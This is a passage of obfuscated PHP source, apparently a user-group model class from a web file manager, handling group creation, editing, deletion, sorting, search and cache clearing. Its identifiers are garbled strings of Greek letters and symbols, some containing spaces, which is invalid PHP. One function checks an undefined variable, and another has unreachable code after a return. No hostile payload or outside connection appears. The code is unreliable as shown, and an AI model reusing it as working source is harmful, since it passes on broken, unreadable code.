$ΓΞΞΪρΞ[$ϊΟ™ζ·Β[2061]]; $‡§θƒ += $ΓΞΞΪρΞ[$ϊΟ™ζ·Β[79]] * ($ΓΞΞΪρΞ[$ϊΟ™ζ·Β[2061]] - 1); $€•Φ—Φκ += $ΓΞΞΪρΞ[$ϊΟ™ζ·Β[2061]]; } } $²ΤΦ¬ = array($ϊΟ™ζ·Β[2071] => $Ή½²Ή¥, $ϊΟ™ζ·Β[2072] => $‡§θƒ, $ϊΟ™ζ·Β[2073] => $‡§θƒ / $Ή½²Ή¥, $ϊΟ™ζ·Β[83] => $χκεΈ»λ, $ϊΟ™ζ·Β[2074] => $€•Φ—Φκ); return $²ΤΦ¬; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\160"; protected $tableMeta = array("\164\x61\x62\x6c\145\x4e\x61\155\x65" => "\147\x72\157\165\160\137\x6d\145\164\141", "\155\x65\164\x61\x46\151\145\x6c\x64" => "\147\x72\x6f\x75\160\x49\x44"); protected function cacheFunctionAlias($µ†£ορ) { $ζν‰ξΰ =& $_SERVER[γγάψ½]; return array($ζν‰ξΰ[2075] => array($µ†£ορ[0], $ζν‰ξΰ[2076]), $ζν‰ξΰ[2077] => array($µ†£ορ[0], $ζν‰ξΰ[2078])); } protected function getInfo($‘ΗΫα, $Η•ώΒΩλ = false) { $›•†ήΧ = $this->getInfoSimple($‘ΗΫα); if (!$›•†ήΧ) { return !1; } if ($Η•ώΒΩλ) { return $this->_listDataApplyItem($›•†ήΧ); } return $this->cacheFunctionGet($_SERVER[γγάψ½][2079], $‘ΗΫα); } protected function getInfoSimple($•±ΰΒΈ™, $ώρε‘‘ = false) { $•©ρΰ‡ =& $_SERVER[γγάψ½]; if ($ώρε‘‘) { $¶ Η±‰Ο = array($•©ρΰ‡[1401] => intval($•±ΰΒΈ™)); $αΈ“‹Ή = $this->where($¶ Η±‰Ο)->find(); return is_array($αΈ“‹Ή) ? $αΈ“‹Ή : array(); } return $this->cacheFunctionGet($•©ρΰ‡[2080], $•±ΰΒΈ™); } protected function groupAdd($·ΒΪ…–) { $υΰσα΅ =& $_SERVER[γγάψ½]; if (!$·ΒΪ…–[$υΰσα΅[193]] && isset($·ΒΪ…–[$υΰσα΅[1401]]) && $·ΒΪ…–[$υΰσα΅[1401]] == 1) { if ($™Θς‰ = $this->getInfoSimple($·ΒΪ…–[$υΰσα΅[1401]], !0)) { return $·ΒΪ…–[$υΰσα΅[1401]]; } } else { $™Θς‰ = $this->getInfoSimple($·ΒΪ…–[$υΰσα΅[193]]); if (!$™Θς‰) { return !1; } } $¦ΗΖ = $υΰσα΅[598]; if ($™Θς‰[$υΰσα΅[589]]) { $¦ΗΖ = $™Θς‰[$υΰσα΅[589]] . $™Θς‰[$υΰσα΅[1401]] . $υΰσα΅[50]; } $Ϊ―Ρ§ = array($υΰσα΅[497] => $this->groupNameAuto($·ΒΪ…–[$υΰσα΅[193]], $·ΒΪ…–[$υΰσα΅[32]]), $υΰσα΅[480] => $·ΒΪ…–[$υΰσα΅[193]], $υΰσα΅[660] => $¦ΗΖ, $υΰσα΅[2081] => $·ΒΪ…–[$υΰσα΅[1980]], $υΰσα΅[2082] => 0, $υΰσα΅[1997] => 0); $·ΒΪ…–[$υΰσα΅[32]] = $Ϊ―Ρ§[$υΰσα΅[32]]; if (isset($·ΒΪ…–[$υΰσα΅[2017]])) { $Ϊ―Ρ§[$υΰσα΅[2017]] = $·ΒΪ…–[$υΰσα΅[2017]]; } else { $ή©ά½™› = $this->max($υΰσα΅[2017]); if (!$ή©ά½™›) { $ή©ά½™› = 0; } $Ϊ―Ρ§[$υΰσα΅[2017]] = $ή©ά½™› + 1; } if (!empty($·ΒΪ…–[$υΰσα΅[1401]])) { $Ϊ―Ρ§[$υΰσα΅[1401]] = $·ΒΪ…–[$υΰσα΅[1401]]; } $¶σ·£ = $this->add($Ϊ―Ρ§); $this->groupMetaEdit($¶σ·£, $·ΒΪ…–); Model($υΰσα΅[1439])->groupRootAdd($¶σ·£); $this->_clearCache($·ΒΪ…–[$υΰσα΅[193]]); return $¶σ·£; } protected function groupEdit($Ν•λΚ³Ι, $‹ΝΡΐ―) { $φΉ΅Ο’ =& $_SERVER[γγάψ½]; $ν›«ΓΩ§ = $this->getInfoSimple($Ν•λΚ³Ι); if (!$ν›«ΓΩ§) { return !1; } if (!empty($‹ΝΡΐ―[$φΉ΅Ο’[193]])) { $£α‰Θα = $this->getInfoSimple($‹ΝΡΐ―[$φΉ΅Ο’[193]]); if (!$£α‰Θα) { return !1; } if ($ν›«ΓΩ§[$φΉ΅Ο’[1401]] == $£α‰Θα[$φΉ΅Ο’[1401]]) { return !1; } if ($‹ΝΡΐ―[$φΉ΅Ο’[193]] != $ν›«ΓΩ§[$φΉ΅Ο’[193]]) { if ($£α‰Θα[$φΉ΅Ο’[589]] !== $ν›«ΓΩ§[$φΉ΅Ο’[589]] && strpos($£α‰Θα[$φΉ΅Ο’[589]], $ν›«ΓΩ§[$φΉ΅Ο’[589]] . $ν›«ΓΩ§[$φΉ΅Ο’[1401]] . $φΉ΅Ο’[50]) === 0) { return !1; } $‹ΝΡΐ―[$φΉ΅Ο’[660]] = $£α‰Θα[$φΉ΅Ο’[589]] . $‹ΝΡΐ―[$φΉ΅Ο’[193]] . $φΉ΅Ο’[50]; $this->_changeChildLevel($ν›«ΓΩ§, $£α‰Θα); $this->_clearCache($£α‰Θα[$φΉ΅Ο’[1401]]); $this->_clearCache($ν›«ΓΩ§[$φΉ΅Ο’[193]]); } } $this->groupMetaEdit($Ν•λΚ³Ι, $‹ΝΡΐ―); $this->_clearChildrenCache($ν›«ΓΩ§); return $this->where(array($φΉ΅Ο’[2083] => $Ν•λΚ³Ι))->save($‹ΝΡΐ―); } private function groupMetaEdit($ΝΦ”φ, &$α΄€Λλ) { $ΐΰΝέΌ† =& $_SERVER[γγάψ½]; if (isset($α΄€Λλ[$ΐΰΝέΌ†[32]])) { $this->setNamePinyin($ΝΦ”φ, $α΄€Λλ[$ΐΰΝέΌ†[32]]); } if (isset($α΄€Λλ[$ΐΰΝέΌ†[2084]])) { $αΤσ…ΆΆ = array($ΐΰΝέΌ†[2084] => $α΄€Λλ[$ΐΰΝέΌ†[2084]], $ΐΰΝέΌ†[2085] => $α΄€Λλ[$ΐΰΝέΌ†[2085]]); unset($α΄€Λλ[$ΐΰΝέΌ†[2084]]); unset($α΄€Λλ[$ΐΰΝέΌ†[2085]]); if (isset($α΄€Λλ[$ΐΰΝέΌ†[2086]])) { $«δ¥ό‡Α = $ΐΰΝέΌ†[1397] . $ΝΦ”φ; $·΄ουΊ = $ΐΰΝέΌ†[1396]; $φ”Σ” = $α΄€Λλ[$ΐΰΝέΌ†[2086]] ? $α΄€Λλ[$ΐΰΝέΌ†[2086]] : $ΐΰΝέΌ†[12]; $Ρμ©β² = Model($ΐΰΝέΌ†[1395])->get($«δ¥ό‡Α, $·΄ουΊ); $Ρμ©β² = $Ρμ©β² ? $Ρμ©β² : $ΐΰΝέΌ†[12]; if ($Ρμ©β² != $φ”Σ”) { if (!$φ”Σ” && $Ρμ©β²) { Model($ΐΰΝέΌ†[1395])->remove($«δ¥ό‡Α, $·΄ουΊ); } else { if ($φ”Σ”) { Model($ΐΰΝέΌ†[1395])->set($«δ¥ό‡Α, $φ”Σ”, $·΄ουΊ); } } } $αΤσ…ΆΆ[$ΐΰΝέΌ†[2086]] = $φ”Σ”; } $this->metaSet($ΝΦ”φ, $αΤσ…ΆΆ); } } private function _clearChildrenCache($ΰ°ηΚι‹) { $ύ· =& $_SERVER[γγάψ½]; $ ΝηΕί = array($ύ·[660] => array($ύ·[620], $ΰ°ηΚι‹[$ύ·[589]] . $ΰ°ηΚι‹[$ύ·[1401]] . $ύ·[621])); $Κ‡ΐ“ψΎ = $this->field($ύ·[1401])->where($ ΝηΕί)->select(); foreach ($Κ‡ΐ“ψΎ as $υ•¥Όΰµ) { $this->_clearCache($υ•¥Όΰµ[$ύ·[1401]]); } } private function _clearCache($–Νά°) { $‚ωΪπ²Λ =& $_SERVER[γγάψ½]; $this->cacheFunctionClear($‚ωΪπ²Λ[2079], $–Νά°); $this->cacheFunctionClear($‚ωΪπ²Λ[2080], $–Νά°); } private function _changeChildLevel($¬ςςζ, $Ηµ£έƒι, $¤Χ¦Λ = false) { $£Έψέ«φ =& $_SERVER[γγάψ½]; $Α·Ξΰ€ = $¬ςςζ[$£Έψέ«φ[589]] . $¬ςςζ[$£Έψέ«φ[1401]] . $£Έψέ«φ[50]; $ ν‡φΖΣ = $Ηµ£έƒι[$£Έψέ«φ[589]] . $Ηµ£έƒι[$£Έψέ«φ[1401]] . $£Έψέ«φ[50] . $¬ςςζ[$£Έψέ«φ[1401]] . $£Έψέ«φ[50]; if ($¤Χ¦Λ) { $ ν‡φΖΣ = $Ηµ£έƒι[$£Έψέ«φ[589]] . $Ηµ£έƒι[$£Έψέ«φ[1401]] . $£Έψέ«φ[50]; } $υΎ¤ψΈΓ = array($£Έψέ«φ[660] => array($£Έψέ«φ[620], $¬ςςζ[$£Έψέ«φ[589]] . $¬ςςζ[$£Έψέ«φ[1401]] . $£Έψέ«φ[621])); $Ισ½ΪΥ = array($£Έψέ«φ[660] => array($£Έψέ«φ[669], "\x72\x65\160\x6c\x61\143\x65\x28\x70\141\x72\145\156\164\114\x65\x76\x65\x6c\x2c\47{$Α·Ξΰ€}\47\x2c\x27{$ ν‡φΖΣ}\x27\x29")); $this->_clearChildrenCache($¬ςςζ); $this->where($υΎ¤ψΈΓ)->data($Ισ½ΪΥ)->save(); } public function setNamePinyin($Έ”ΪΘξ, $ΖΉ¥χζ€ = false) { $ΡξΛΫ³ =& $_SERVER[γγάψ½]; if (!$ΖΉ¥χζ€) { $¥Ψ…χ®ρ = $this->getInfoSimple($Έ”ΪΘξ); $ΖΉ¥χζ€ = $¥Ψ…χ®ρ[$ΡξΛΫ³[32]]; } if (!Input::check($ΖΉ¥χζ€, $ΡξΛΫ³[663])) { $this->metaSet($Έ”ΪΘξ, $ΡξΛΫ³[541], null); $this->metaSet($Έ”ΪΘξ, $ΡξΛΫ³[540], null); return; } $Ι΅‘„Έ = array($ΡξΛΫ³[541] => str_replace($ΡξΛΫ³[53], $ΡξΛΫ³[12], Pinyin::get($ΖΉ¥χζ€)), $ΡξΛΫ³[540] => Pinyin::get($ΖΉ¥χζ€, $ΡξΛΫ³[664])); $this->metaSet($Έ”ΪΘξ, $Ι΅‘„Έ); } protected function metaSet($ε¥ΉΑ‡, $Ϊό‘ζ¦± = null, $’°Ίι­Ή = null) { $this->_clearCache($ε¥ΉΑ‡); return parent::metaSet($ε¥ΉΑ‡, $Ϊό‘ζ¦±, $’°Ίι­Ή); } protected function groupStatus($υπϋΎΔΌ, $¶–ϋϊ½Ί) { $™ϊκΐΪ =& $_SERVER[γγάψ½]; $θω¥± = $this->getInfoSimple($υπϋΎΔΌ); if (!$θω¥±) { return !1; } $this->_clearCache($υπϋΎΔΌ); return $this->metaSet($υπϋΎΔΌ, $™ϊκΐΪ[825], $¶–ϋϊ½Ί); if ($¶–ϋϊ½Ί == $™ϊκΐΪ[91]) { $ΨΎ•τδ— = $this->parentLevelArray($θω¥±[$™ϊκΐΪ[589]]); } else { } $ΨΎ•τδ—[] = $θω¥±[$™ϊκΐΪ[1401]]; $΄τΊ§ = array(); foreach ($ΨΎ•τδ— as $υπϋΎΔΌ) { $΄τΊ§[] = array($™ϊκΐΪ[1401] => $υπϋΎΔΌ, $™ϊκΐΪ[97] => $™ϊκΐΪ[825], $™ϊκΐΪ[453] => $¶–ϋϊ½Ί); $this->_clearCache($υπϋΎΔΌ); } return Model($™ϊκΐΪ[2087])->addAll($΄τΊ§, array(), !0); } protected function groupRemove($ζ²κ³Μ‹, $ιβφήίΨ = false) { $ΗΞή²Γ =& $_SERVER[γγάψ½]; $‚®‡Χ = array($ΗΞή²Γ[1401] => $ζ²κ³Μ‹); $ηΣ‰‹» = $this->where($‚®‡Χ)->find(); if (!$ηΣ‰‹» || $ηΣ‰‹»[$ΗΞή²Γ[193]] == 0) { return !1; } if (!$ιβφήίΨ) { $ίθ•™ζΒ = $this->getInfoSimple($ηΣ‰‹»[$ΗΞή²Γ[193]]); $this->_changeChildLevel($ηΣ‰‹», $ίθ•™ζΒ, !0); $this->where(array($ΗΞή²Γ[193] => $ζ²κ³Μ‹))->save(array($ΗΞή²Γ[193] => $ηΣ‰‹»[$ΗΞή²Γ[193]])); $this->_clearCache($ίθ•™ζΒ[$ΗΞή²Γ[1401]]); } Model($ΗΞή²Γ[2087])->where($‚®‡Χ)->delete(); Model($ΗΞή²Γ[2088])->where($‚®‡Χ)->delete(); Model($ΗΞή²Γ[905])->groupRootRemove($ζ²κ³Μ‹); $this->_clearCache($ηΣ‰‹»[$ΗΞή²Γ[193]]); return $this->where($‚®‡Χ)->delete(); } protected function groupSort($¬ίΖ”—Δ) { $ ΙΤ°π’ =& $_SERVER[γγάψ½]; $ΐ¬’¥Τ = array(); foreach ($¬ίΖ”—Δ as $¬Ή¤ϊφΝ => $†θί΄‰) { $ΐ¬’¥Τ[] = array($ ΙΤ°π’[1401], $†θί΄‰, $ ΙΤ°π’[2017], $¬Ή¤ϊφΝ + 1); } $this->saveAll($ΐ¬’¥Τ); } public function listData() { $ΠρΆνς = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ΠρΆνς[$_SERVER[γγάψ½][448]]); return $ΠρΆνς; } private function _makeOrder($†—‡ΗΗ„ = '') { $ΠΰψΡπ =& $_SERVER[γγάψ½]; $ΞψΒ„¤… = array($ΠΰψΡπ[1401], $ΠΰψΡπ[32], $ΠΰψΡπ[1982], $ΠΰψΡπ[234]); $¤ΓέΜ© = array($ΠΰψΡπ[526] => $ΠΰψΡπ[527], $ΠΰψΡπ[528] => $ΠΰψΡπ[529]); $­—πσ² = Input::get($ΠΰψΡπ[533], $ΠΰψΡπ[7], $ΠΰψΡπ[1997], $ΞψΒ„¤…); $ψίΟΥβΎ = Input::get($ΠΰψΡπ[534], $ΠΰψΡπ[7], $ΠΰψΡπ[2089], array($ΠΰψΡπ[2089], $ΠΰψΡπ[528])); $ψίΟΥβΎ = $¤ΓέΜ©[$ψίΟΥβΎ]; $†—‡ΗΗ„ = $†—‡ΗΗ„ . "{$­—πσ²}\x20{$ψίΟΥβΎ}\54\40\x67\x72\x6f\x75\x70\111\104\x20\x61\163\143"; return $this->order($†—‡ΗΗ„); } public function listChild($‹ύ“Ώ) { $Ρ‹…›ξƒ =& $_SERVER[γγάψ½]; $³ƒ¦Δϋ = $this->where(array($Ρ‹…›ξƒ[193] => $‹ύ“Ώ))->_makeOrder()->selectPage(200); $this->_listDataApply($³ƒ¦Δϋ[$Ρ‹…›ξƒ[448]]); return $³ƒ¦Δϋ; } public function listChildIds($ώχΣΡΆΎ) { $•ύΓ΅ =& $_SERVER[γγάψ½]; if (is_string($ΛοΝλΙ)) { $ώχΣΡΆΎ = explode($•ύΓ΅[50], $ώχΣΡΆΎ); } $ΉΥΪΨΩ = $this->where(array($•ύΓ΅[1401] => array($•ύΓ΅[7], $ώχΣΡΆΎ)))->field($•ύΓ΅[2090])->select(); if (!$ΉΥΪΨΩ) { return !1; } $π®ΎοΊΚ = array(); foreach ($ΉΥΪΨΩ as $ςϋΙΕϊ) { $π®ΎοΊΚ[] = "\163\x65\154\x65\x63\164\40\x67\x72\157\165\160\x49\104\x20\x66\x72\x6f\x6d\x20\140\147\x72\x6f\x75\160\x60\40\x77\150\145\162\145\40\160\x61\x72\x65\x6e\x74\114\145\x76\145\154\x20\x6c\151\153\x65\40\x27{$ςϋΙΕϊ[$•ύΓ΅[589]]}{$ςϋΙΕϊ[$•ύΓ΅[1401]]}\x2c\x25\47"; } $π®ΎοΊΚ = implode($•ύΓ΅[2091], $π®ΎοΊΚ); $ΉΥΪΨΩ = $this->query($π®ΎοΊΚ); if (!$ΉΥΪΨΩ) { return array(); } $ώχΣΡΆΎ = array_to_keyvalue($ΉΥΪΨΩ, $•ύΓ΅[12], $•ύΓ΅[1401]); return array_unique($ώχΣΡΆΎ); } public function listByID($‰χ©£μ) { $Π‰«Λ =& $_SERVER[γγάψ½]; if (!$‰χ©£μ) { return array(); } $η•λΚΒ€ = array($Π‰«Λ[1401] => array($Π‰«Λ[7], $‰χ©£μ)); $Σβ ΟΔπ = $this->where($η•λΚΒ€)->select(); $Σβ ΟΔπ = array_sort_keep($Σβ ΟΔπ, $Π‰«Λ[1401], $‰χ©£μ); $this->_listDataApply($Σβ ΟΔπ); return $Σβ ΟΔπ; } public function listSearch($Ύ¦Ν–ψ) { $θΆΝ»ί½ =& $_SERVER[γγάψ½]; $ƒ΄Ζωέ™ = trim($Ύ¦Ν–ψ[$θΆΝ»ί½[2092]]); $™Χ’§Δδ = explode($θΆΝ»ί½[53], $ƒ΄Ζωέ™); if (!$ƒ΄Ζωέ™ || count($™Χ’§Δδ) == 1) { return $this->listSearchNow($Ύ¦Ν–ψ); } $γαε’ = array($θΆΝ»ί½[448] => array()); foreach ($™Χ’§Δδ as $Χµ²ΝΕ†) { if (!trim($Χµ²ΝΕ†)) { continue; } $Ύ¦Ν–ψ[$θΆΝ»ί½[2092]] = $Χµ²ΝΕ†; $†έΤ¨Τ = $this->listSearchNow($Ύ¦Ν–ψ); $γαε’[$θΆΝ»ί½[448]] = array_merge($γαε’[$θΆΝ»ί½[448]], $†έΤ¨Τ[$θΆΝ»ί½[448]]); } $γαε’[$θΆΝ»ί½[448]] = array_unique_by_key($γαε’[$θΆΝ»ί½[448]], $θΆΝ»ί½[1401]); $γαε’[$θΆΝ»ί½[445]] = array($θΆΝ»ί½[446] => count($γαε’[$θΆΝ»ί½[448]]), $θΆΝ»ί½[442] => 20, $θΆΝ»ί½[431] => 1, $θΆΝ»ί½[447] => 1); return $γαε’; } public function listSearchNow($‚ύ‡™―τ) { $ΧΣ“ό³ =& $_SERVER[γγάψ½]; $›ΝΫ“τ = trim($‚ύ‡™―τ[$ΧΣ“ό³[2092]]); $°Ξ»Ωίφ = isset($‚ύ‡™―τ[$ΧΣ“ό³[2093]]) ? $‚ύ‡™―τ[$ΧΣ“ό³[2093]] : !1; if (!trim($›ΝΫ“τ)) { return !1; } $›ΝΫ“τ = str_replace($ΧΣ“ό³[2094], $ΧΣ“ό³[2095], $›ΝΫ“τ); $ΉωµβΛ = array($ΧΣ“ό³[1401] => array($ΧΣ“ό³[462], "{$›ΝΫ“τ}\x25"), $ΧΣ“ό³[32] => array($ΧΣ“ό³[462], "\x25{$›ΝΫ“τ}\45"), $ΧΣ“ό³[1086] => $ΧΣ“ό³[2096]); if ($°Ξ»Ωίφ) { $Γύ‚ϋΨ = $this->getInfoSimple($°Ξ»Ωίφ); $σκΞ…ΰ‡ = $Γύ‚ϋΨ[$ΧΣ“ό³[589]] . $°Ξ»Ωίφ . $ΧΣ“ό³[621]; $ΉωµβΛ = array($ΉωµβΛ, array($ΧΣ“ό³[589] => array($ΧΣ“ό³[462], $σκΞ…ΰ‡))); } $ΉωµβΛ = $this->parseWhereLike($ΉωµβΛ); $ιΎΖ¨Ζ = $this->_makeOrder()->where($ΉωµβΛ)->selectPage(20); $ιΎΖ¨Ζ = $ιΎΖ¨Ζ ? $ιΎΖ¨Ζ : array($ΧΣ“ό³[448] => array(), $ΧΣ“ό³[445] => array()); if (!$ιΎΖ¨Ζ || count($ιΎΖ¨Ζ[$ΧΣ“ό³[448]]) < 5 && Input::check($›ΝΫ“τ, $ΧΣ“ό³[396])) { $±¬·ζή = $this->groupChildrenAll($°Ξ»Ωίφ); $•α’τΔ = $this->_searchFromMeta($ΧΣ“ό³[540], $›ΝΫ“τ, 10, $±¬·ζή); $Π¶³°γ­ = $this->_searchFromMeta($ΧΣ“ό³[541], $›ΝΫ“τ, 10, $±¬·ζή); $‰Π΄«Ρ° = array_merge($•α’τΔ, $Π¶³°γ­, $ιΎΖ¨Ζ[$ΧΣ“ό³[448]]); $ιΎΖ¨Ζ[$ΧΣ“ό³[448]] = array_unique_by_key($‰Π΄«Ρ°, $ΧΣ“ό³[1401]); $ιΎΖ¨Ζ[$ΧΣ“ό³[445]][$ΧΣ“ό³[446]] = count($ιΎΖ¨Ζ[$ΧΣ“ό³[448]]); $ιΎΖ¨Ζ[$ΧΣ“ό³[445]][$ΧΣ“ό³[447]] = ceil($ιΎΖ¨Ζ[$ΧΣ“ό³[445]][$ΧΣ“ό³[446]] / $ιΎΖ¨Ζ[$ΧΣ“ό³[445]][$ΧΣ“ό³[442]]); } $this->_listDataApply($ιΎΖ¨Ζ[$ΧΣ“ό³[448]]); return $ιΎΖ¨Ζ; } protected function groupChildrenAll($Ϊ―ι“Ε) { $ν…ιΑτ =& $_SERVER[γγάψ½]; if (!$Ϊ―ι“Ε) { return !1; } if (!is_array($Ϊ―ι“Ε)) { $Ϊ―ι“Ε = array($Ϊ―ι“Ε); } $©ώΎ’χ = $Ϊ―ι“Ε; foreach ($Ϊ―ι“Ε as $ώυα…Ε¨) { $ηζθνΘ = $this->getInfoSimple($ώυα…Ε¨); $θ‚“Ω = array($ν…ιΑτ[589] => array($ν…ιΑτ[462], $ηζθνΘ[$ν…ιΑτ[589]] . $ώυα…Ε¨ . $ν…ιΑτ[621])); $Ν™ΌΩΰ = $this->field($ν…ιΑτ[1401])->where($θ‚“Ω)->select(); $©ώΎ’χ = array_merge($©ώΎ’χ, array_to_keyvalue($Ν™ΌΩΰ, $ν…ιΑτ[12], $ν…ιΑτ[1401])); } return array_unique($©ώΎ’χ); } private function _searchFromMeta($“ƒ—φ , $µ›µΖλύ, $Ρ‚³’, $ϋ–‡­) { $όζϊ·¥ =& $_SERVER[γγάψ½]; $µ›µΖλύ = strtolower($µ›µΖλύ); $ωΦΖςΓ± = array($όζϊ·¥[97] => $“ƒ—φ , $όζϊ·¥[453] => array($όζϊ·¥[462], "\x25{$µ›µΖλύ}\45")); $ωΦΖςΓ± = $this->parseWhereLike($ωΦΖςΓ±); if ($ϋ–‡­) { $ωΦΖςΓ±[$όζϊ·¥[1401]] = array($όζϊ·¥[7], $ϋ–‡­); } $ΣόΣΨό = Model($όζϊ·¥[2097])->where($ωΦΖςΓ±)->limit($Ρ‚³’)->select(); if (!$ΣόΣΨό) { return array(); } $ΣόΣΨό = array_to_keyvalue($ΣόΣΨό, $όζϊ·¥[12], $όζϊ·¥[1401]); $μόΊ‹ = $this->where(array($όζϊ·¥[2083] => array($όζϊ·¥[7], $ΣόΣΨό)))->select(); if (!$μόΊ‹) { return array(); } return $μόΊ‹; } protected function _listDataApplyItem($„ά¬αΠ¥) { $ΉΏΑΰϊ» = array($„ά¬αΠ¥); $this->_listDataApply($ΉΏΑΰϊ»); return $ΉΏΑΰϊ»[0]; } protected function _listDataApply(&$Ζδ£έόΕ) { $Ετή•σ =& $_SERVER[γγάψ½]; if (!$Ζδ£έόΕ) { return; } $‘Άμ = array_to_keyvalue($Ζδ£έόΕ, $Ετή•σ[12], $Ετή•σ[1401]); $this->_listAppendChildren($Ζδ£έόΕ); $this->_listAppendChildrenMember($Ζδ£έόΕ); $this->_listAppendMeta($Ζδ£έόΕ, $‘Άμ); $this->_listAppendParent($Ζδ£έόΕ); $this->_listAppendSourceRoot($Ζδ£έόΕ, $‘Άμ); } private function _listAppendChildren(&$µΎ»δΝ®) { $ΣΆ©‰ωΌ =& $_SERVER[γγάψ½]; $α°ΥϊΏ = array_to_keyvalue($µΎ»δΝ®, $ΣΆ©‰ωΌ[12], $ΣΆ©‰ωΌ[1401]); $ΎΖξ“ΨΜ = array($ΣΆ©‰ωΌ[193] => array($ΣΆ©‰ωΌ[7], $α°ΥϊΏ)); $ΑΧ·µ«ό = array($ΣΆ©‰ωΌ[193], $ΣΆ©‰ωΌ[2098] => $ΣΆ©‰ωΌ[570]); $ρΌχψΩ³ = $this->field($ΑΧ·µ«ό)->where($ΎΖξ“ΨΜ)->group($ΣΆ©‰ωΌ[193])->select(); $Ω‰“υΊυ = array_to_keyvalue($ρΌχψΩ³, $ΣΆ©‰ωΌ[193], $ΣΆ©‰ωΌ[570]); foreach ($µΎ»δΝ® as &$ ¶Ώμ·) { $ΖΞΆ¤¬σ = $ ¶Ώμ·[$ΣΆ©‰ωΌ[1401]]; $ ¶Ώμ·[$ΣΆ©‰ωΌ[2099]] = isset($Ω‰“υΊυ[$ΖΞΆ¤¬σ]) ? intval($Ω‰“υΊυ[$ΖΞΆ¤¬σ]) : !1; } unset($ ¶Ώμ·); } private function _listAppendChildrenMember(&$Όωέ‰¬γ) { $½Ξ³„ =& $_SERVER[γγάψ½]; $»†δΰέΪ = array_to_keyvalue($Όωέ‰¬γ, $½Ξ³„[12], $½Ξ³„[1401]); $‹ό²ϊμΜ = array($½Ξ³„[1401] => array($½Ξ³„[7], $»†δΰέΪ)); $§΄φμ€ά = array($½Ξ³„[1401], $½Ξ³„[2098] => $½Ξ³„[570]); $―ΜΫƒ«έ = Model($½Ξ³„[2088])->field($§΄φμ€ά)->where($‹ό²ϊμΜ)->group($½Ξ³„[1401])->select(); $εƒμΝ = array_to_keyvalue($―ΜΫƒ«έ, $½Ξ³„[1401], $½Ξ³„[570]); foreach ($Όωέ‰¬γ as &$η™ίββ°) { $ƒΑϋίΚΈ = $η™ίββ°[$½Ξ³„[1401]]; $η™ίββ°[$½Ξ³„[2100]] = isset($εƒμΝ[$ƒΑϋίΚΈ]) ? intval($εƒμΝ[$ƒΑϋίΚΈ]) : !1; } unset($η™ίββ°); } private function _listAppendMeta(&$™ΎξΎ, $Ό©) { $ΟΆ―³ =& $_SERVER[γγάψ½]; $°ΉΑήΣ“ = array($ΟΆ―³[1401] => array($ΟΆ―³[7], $Ό©)); $¤Ϋή“ύΏ = Model($ΟΆ―³[2087])->where($°ΉΑήΣ“)->select(); $¤Ϋή“ύΏ = array_to_keyvalue_group($¤Ϋή“ύΏ, $ΟΆ―³[1401]); foreach ($¤Ϋή“ύΏ as &$ΰχσ½Ύ¥) { $ΰχσ½Ύ¥ = array_to_keyvalue($ΰχσ½Ύ¥, $ΟΆ―³[97], $ΟΆ―³[453]); } unset($ΰχσ½Ύ¥); foreach ($™ΎξΎ as &$γΎηαΑ) { $γΎηαΑ[$ΟΆ―³[544]] = array(); if (isset($¤Ϋή“ύΏ[$γΎηαΑ[$ΟΆ―³[1401]]])) { $γΎηαΑ[$ΟΆ―³[544]] = $¤Ϋή“ύΏ[$γΎηαΑ[$ΟΆ―³[1401]]]; } } unset($γΎηαΑ); } protected function parentLevelArray($ΌΗχΚΈ¤) { $ηΎπ‹ =& $_SERVER[γγάψ½]; $ΌΗχΚΈ¤ = explode($ηΎπ‹[50], trim($ΌΗχΚΈ¤, $ηΎπ‹[50])); $ΌΗχΚΈ¤ = array_remove_value($ΌΗχΚΈ¤, $ηΎπ‹[231]); return $ΌΗχΚΈ¤; } protected function parentInGroup($»°σενΧ, $ΊέώΉω’) { $βΦ—Έ“ =& $_SERVER[γγάψ½]; $°ΜωΰΝΉ = $this->getInfoSimple($»°σενΧ); if (!$°ΜωΰΝΉ) { return !0; } $ς­Ί = $this->parentLevelArray($°ΜωΰΝΉ[$βΦ—Έ“[589]]); $ς­Ί[] = $»°σενΧ; foreach ($ς­Ί as $»°σενΧ) { if (in_array($»°σενΧ . $βΦ—Έ“[12], $ΊέώΉω’)) { return !0; } } return !1; } private function _listAppendParent(&$ΒδίώΕ±) { $υυ…¥­¥ =& $_SERVER[γγάψ½]; $ΈγΈ›‡ = array(); foreach ($ΒδίώΕ± as &$ηΩλΚή) { $ΈγΈ›‡[$ηΩλΚή[$υυ…¥­¥[1401]]] = $ηΩλΚή[$υυ…¥­¥[32]]; $ ΄»ξ§ = $this->parentLevelArray($ηΩλΚή[$υυ…¥­¥[589]]); foreach ($ ΄»ξ§ as $ήζχΆ―) { if (!isset($ΈγΈ›‡[$ήζχΆ―])) { $ΈγΈ›‡[$ήζχΆ―] = 0; } } } unset($ηΩλΚή); foreach ($ΈγΈ›‡ as $®άά±ΔΚ => $²κο»ΠΙ) { if ($²κο»ΠΙ) { continue; } $½²Ύε = $this->getInfoSimple($®άά±ΔΚ); $ΈγΈ›‡[$®άά±ΔΚ] = $½²Ύε[$υυ…¥­¥[32]]; } $ϊΛ™‚› = $GLOBALS[$υυ…¥­¥[6]][$υυ…¥­¥[92]][$υυ…¥­¥[2101]]; if (KodUser::isRoot()) { $ϊΛ™‚› = !1; } foreach ($ΒδίώΕ± as &$ηΩλΚή) { $ ΄»ξ§ = $this->parentLevelArray($ηΩλΚή[$υυ…¥­¥[589]]); $Ί€ςΩφ = $υυ…¥­¥[12]; foreach ($ ΄»ξ§ as $®άά±ΔΚ => $ήζχΆ―) { if ($ϊΛ™‚› && $®άά±ΔΚ == 0) { continue; } $Ί€ςΩφ .= $ΈγΈ›‡[$ήζχΆ―] . $υυ…¥­¥[8]; } if ($ ΄»ξ§) { $Ί€ςΩφ .= $ηΩλΚή[$υυ…¥­¥[32]]; } $ηΩλΚή[$υυ…¥­¥[594]] = str_replace($υυ…¥­¥[257], $υυ…¥­¥[8], $Ί€ςΩφ); } unset($ηΩλΚή); } private function _listAppendSourceRoot(&$ςΐΞώι, $ΖΛΏΑ–) { $«χΫΨ΅ =& $_SERVER[γγάψ½]; $ΤςΈς“ = Model($«χΫΨ΅[905])->listSourceRoot(SourceModel::TYPE_GROUP, $ΖΛΏΑ–); $ΤςΈς“ = array_to_keyvalue($ΤςΈς“, $«χΫΨ΅[574]); $ΤςΈς“ = array_remove_key($ΤςΈς“, $«χΫΨ΅[574]); foreach ($ςΐΞώι as &$εκπΎξ) { $εκπΎξ[$«χΫΨ΅[90]] = 